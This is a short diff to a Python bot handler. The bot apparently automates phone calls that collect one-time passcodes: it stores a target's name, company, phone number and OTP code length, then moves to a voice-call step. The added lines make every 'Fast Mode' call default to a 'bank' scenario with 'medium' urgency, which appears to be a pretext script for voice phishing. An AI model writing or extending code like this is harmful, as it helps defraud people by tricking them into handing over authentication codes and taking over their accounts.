@@ -6699,6 +6699,12 @@ def handle_stateful_text(message):
         write_user_file(user_id_str, "Delivery.txt", delivery)
         write_user_file(user_id_str, "Digits.txt", otp_length)
         write_user_file(user_id_str, "CodeLength.txt", otp_length)
+        # Fast Mode is a one-line shortcut into the shared Normal Call flow.
+        # The upgraded prompt builder needs the new Scenario + Urgency steps that
+        # the full wizard collects; default them so the locked reason facts and
+        # urgency tone always apply (operator can override via Normal Call).
+        write_user_file(user_id_str, "scenario.txt", "bank")
+        write_user_file(user_id_str, "urgency.txt", "medium")
         set_user_state(user_id_str, "normal_call_step_10_voice")
 
         summary = f"⚡ Fast call ready:\n{name} @ {company}\nPhone: {phone_clean}"
